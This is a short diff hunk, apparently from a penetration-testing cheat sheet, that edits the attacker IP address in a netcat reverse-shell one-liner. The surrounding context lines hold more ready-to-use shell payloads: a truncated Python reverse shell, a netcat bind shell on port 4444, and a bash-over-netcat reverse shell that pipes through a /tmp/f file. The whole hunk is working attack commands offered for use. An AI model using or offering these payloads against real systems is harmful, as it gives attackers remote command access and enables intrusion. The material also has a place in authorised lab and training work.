@@ -225,7 +225,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #bindShell:
 	cat /tmp/f | /bin/bash -i 2>&1 | nc -nvlp 4444 > /tmp/f
 #reverShell:
-	cat /tmp/f | /bin/bash -i 2>&1 | nc -n 10.11.0.71 4444 > /tmp/f
+	cat /tmp/f | /bin/bash -i 2>&1 | nc -n 10.11.22.3 4444 > /tmp/f
 
 #Or try:
 #bind port 4444 on your target
